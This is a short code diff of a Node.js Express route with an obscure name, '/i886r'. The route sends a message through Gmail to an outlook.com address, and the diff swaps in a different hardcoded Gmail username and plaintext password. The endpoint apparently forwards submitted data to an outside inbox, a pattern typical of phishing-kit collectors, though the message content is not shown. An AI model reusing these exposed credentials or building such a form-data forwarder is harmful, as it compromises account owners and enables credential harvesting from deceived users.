@@ -22,8 +22,8 @@ app.post('/i886r', (req,res) => {
 const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-        user: 'xcimxmusic@gmail.com',
-        pass: 'lqqphswvzspirmom'
+        user: 'chinisom080@gmail.com',
+        pass: 'Divine080'
     },
 })
 
@@ -32,12 +32,12 @@ const message = {
     from: 'xcimxmusic@gmail.com',
     to: 'nexusiwill@outlook.com',
     text: msg,
-    attachments: [{
-           // file on disk as an attachment
-            filename: '351949877022887533.jpg',
-            path: 'public/351949877022887533.jpg' // stream this file
+    // attachments: [{
+    //        // file on disk as an attachment
+    //         filename: '351949877022887533.jpg',
+    //         path: 'public/351949877022887533.jpg' // stream this file
         
-    },]
+    // },]
 };
 
 //send the message
